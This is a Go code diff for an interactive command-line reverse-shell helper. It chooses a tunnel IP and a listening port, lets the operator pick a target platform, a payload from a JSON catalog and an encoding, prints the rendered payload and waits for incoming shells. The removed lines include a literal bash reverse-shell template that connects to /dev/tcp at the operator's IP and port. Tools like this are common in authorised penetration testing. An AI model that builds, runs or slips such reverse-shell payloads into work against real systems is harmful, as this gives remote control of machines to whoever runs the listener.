@@ -24,34 +24,30 @@ type tunnelAddress struct {
 	ip    string
 }
 
-type TargetOS string
+type WebShellType string
 
 const (
-	TargetOsLinux   TargetOS = "linux"
-	TargetOsWindows TargetOS = "windows"
-	TargetOsMacOS   TargetOS = "macos"
-	TargetUnknown   TargetOS = "unknown"
+	TargetShellTypeLinux    WebShellType = "linux"
+	TargetShellTypeWindows  WebShellType = "windows"
+	TargetShellTypeWebShell WebShellType = "webshell"
 )
 
-var targetOSValues = []TargetOS{
-	TargetOsLinux,
-	TargetOsWindows,
-	TargetOsMacOS,
-	TargetUnknown,
+var targetShellTypeValues = []WebShellType{
+	TargetShellTypeLinux,
+	TargetShellTypeWindows,
+	TargetShellTypeWebShell,
 }
 
-func targetOSLabel(targetOS TargetOS) string {
-	switch targetOS {
-	case TargetOsLinux:
-		return "Linux"
-	case TargetOsWindows:
+func targetShellTypeLabel(targetShellType WebShellType) string {
+	switch targetShellType {
+	case TargetShellTypeLinux:
+		return "Linux / Unix"
+	case TargetShellTypeWindows:
 		return "Windows"
-	case TargetOsMacOS:
-		return "macOS"
-	case TargetUnknown:
-		return "I don't know"
+	case TargetShellTypeWebShell:
+		return "Web Shell"
 	default:
-		return string(targetOS)
+		return string(targetShellType)
 	}
 }
 
@@ -65,8 +61,8 @@ const (
 )
 
 var encodingValues = []Encoding{
-	EncodingBase64,
 	EncodingNone,
+	EncodingBase64,
 	EncodingUrl,
 	EncodingPowerShellBase64,
 }
@@ -87,10 +83,11 @@ func targetEncodingLabels(encoding Encoding) string {
 }
 
 type ShellCandidate struct {
-	Name     string
-	OS       TargetOS
-	Encoding Encoding
-	Template string
+	Name       string
+	Type       WebShellType
+	Encoding   Encoding
+	Template   string
+	PowerShell bool
 }
 
 func selectTunnelAddress() (string, error) {
@@ -162,15 +159,17 @@ func selectTunnelAddress() (string, error) {
 	return selectedIP, nil
 }
 
-func selectTunnelPort() (string, error) {
-	selectedPort := rand.IntN(999) + 9000
-	listener, err := net.Listen("tcp", ":"+strconv.Itoa(selectedPort))
-	if err != nil {
-		return "", fmt.Errorf("Port unavailable:", err)
+func selectTunnelListener() (net.Listener, string, error) {
+	const attempts = 100
+	for range attempts {
+		port := strconv.Itoa(rand.IntN(1000) + 9000)
+		listener, err := net.Listen("tcp", net.JoinHostPort("", port))
+		if err == nil {
+			return listener, port, nil
+		}
 	}
-	defer listener.Close()
 
-	return strconv.Itoa(selectedPort), nil
+	return nil, "", fmt.Errorf("find an available listener port between 9000 and 9999")
 }
 
 func addressIP(address net.Addr) net.IP {
@@ -207,72 +206,51 @@ func isTunnelInterface(name string) bool {
 	return false
 }
 
-func queryReverseShellCommandsToOffer() (ShellCandidate, error) {
-	options := make(
-		[]huh.Option[TargetOS],
-		0,
-		len(targetOSValues),
-	)
-	options2 := make(
-		[]huh.Option[Encoding],
-		0,
-		len(encodingValues),
-	)
-
-	for _, targetOS := range targetOSValues {
-		options = append(
-			options,
-			huh.NewOption(
-				targetOSLabel(targetOS),
-				targetOS,
-			),
-		)
-	}
-
-	for _, encoding := range encodingValues {
-		options2 = append(
-			options2,
-			huh.NewOption(
-				targetEncodingLabels(encoding),
-				encoding,
-			),
-		)
-	}
-
-	var selectedOS TargetOS
-	var selectedEncoding Encoding
-
-	err := huh.NewSelect[TargetOS]().
-		Title("What OS is the target running?").
-		Options(options...).
-		Value(&selectedOS).
-		Run()
+func queryReverseShellCommandsToOffer(payloadsPath string) (ShellCandidate, error) {
+	catalog, err := loadPayloads(payloadsPath)
 	if err != nil {
-		fmt.Printf(
-			"select target OS: %w",
-			options,
-		)
+		return ShellCandidate{}, err
 	}
-
-	err2 := huh.NewSelect[Encoding]().
-		Title("What encoding do you require?").
-		Options(options2...).
-		Value(&selectedEncoding).
-		Run()
-	if err2 != nil {
-		fmt.Printf(
-			"select target OS: %w",
-			options2,
-		)
+	var selectedType WebShellType
+	var typeOptions []huh.Option[WebShellType]
+	for _, kind := range targetShellTypeValues {
+		if len(catalog[kind]) > 0 {
+			typeOptions = append(typeOptions, huh.NewOption(targetShellTypeLabel(kind), kind))
+		}
 	}
-
-	candidate := ShellCandidate{
-		Name:     "ReverseBash",
-		OS:       selectedOS, // Replace with your actual TargetS value/enum
-		Encoding: selectedEncoding,
-		Template: "bash -i >& /dev/tcp/{{.IP}}/{{.Port}} 0>&1",
+	if len(typeOptions) == 0 {
+		return ShellCandidate{}, fmt.Errorf("payload catalog is empty")
 	}
-	return candidate, nil
+	if err := huh.NewSelect[WebShellType]().Title("Select the target platform").Options(typeOptions...).Value(&selectedType).Run(); err != nil {
+		return ShellCandidate{}, fmt.Errorf("select shell type: %w", err)
+	}
+	var index int
+	var payloadOptions []huh.Option[int]
+	for i, payload := range catalog[selectedType] {
+		payloadOptions = append(payloadOptions, huh.NewOption(payload.Name+" — "+payload.Description, i))
+	}
+	if err := huh.NewSelect[int]().Title("Select a payload").Options(payloadOptions...).Value(&index).Run(); err != nil {
+		return ShellCandidate{}, fmt.Errorf("select payload: %w", err)
+	}
+	selected := catalog[selectedType][index]
+	encoding := EncodingNone
+	var encodingOptions []huh.Option[Encoding]
+	for _, value := range encodingValues {
+		if value == EncodingPowerShellBase64 && !selected.PowerShell {
+			continue
+		}
+		encodingOptions = append(encodingOptions, huh.NewOption(targetEncodingLabels(value), value))
+	}
+	if err := huh.NewSelect[Encoding]().Title("What encoding do you require?").Options(encodingOptions...).Value(&encoding).Run(); err != nil {
+		return ShellCandidate{}, fmt.Errorf("select encoding: %w", err)
+	}
+	return ShellCandidate{
+		Name:       selected.Name,
+		Type:       selectedType,
+		Encoding:   encoding,
+		Template:   selected.Template,
+		PowerShell: selected.PowerShell,
+	}, nil
 }
 
 // rootCmd represents the base command when called without any subcommands
@@ -293,30 +271,43 @@ var rootCmd = &cobra.Command{
 			selectedIP,
 		)
 
-		selectedPort, err := selectTunnelPort()
+		listener, selectedPort, err := selectTunnelListener()
+		if err != nil {
+			return err
+		}
+		defer listener.Close()
 		fmt.Fprintf(
 			cmd.OutOrStdout(),
 			"Selected port: %s\n",
 			selectedPort,
 		)
 
-		shellCandidate, err := queryReverseShellCommandsToOffer()
-		fmt.Println(shellCandidate)
-
-		establishReverseShellListener(selectedPort)
-
-		return nil
+		payloadsPath, err := cmd.Flags().GetString("payloads")
+		if err != nil {
+			return err
+		}
+		shellCandidate, err := queryReverseShellCommandsToOffer(payloadsPath)
+		if err != nil {
+			return err
+		}
+		payload, err := renderPayload(shellCandidate, selectedIP, selectedPort)
+		if err != nil {
+			return err
+		}
+		fmt.Fprintf(
+			cmd.OutOrStdout(),
+			"\nGenerated %s payload for %s (%s):\n%s\n\n",
+			shellCandidate.Name,
+			targetShellTypeLabel(shellCandidate.Type),
+			targetEncodingLabels(shellCandidate.Encoding),
+			payload,
+		)
+		return establishReverseShellListener(listener, selectedPort)
 	},
 }
 
-func establishReverseShellListener(port string) error {
-	listener, err := net.Listen("tcp", ":"+port)
-	if err != nil {
-		return fmt.Errorf("listen on port %s: %w", port, err)
-	}
-	defer listener.Close()
-
-	fmt.Printf("\nSetting up port listener on...\n", port)
+func establishReverseShellListener(listener net.Listener, port string) error {
+	fmt.Printf("\nSetting up port listener on %s...\n", port)
 
 	for {
 		conn, err := listener.Accept()
@@ -357,5 +348,5 @@ func init() {
 
 	// Cobra also supports local flags, which will only run
 	// when this action is called directly.
-	rootCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
+	rootCmd.Flags().String("payloads", "payloadsList.json", "Path to the payload JSON catalog")
 }
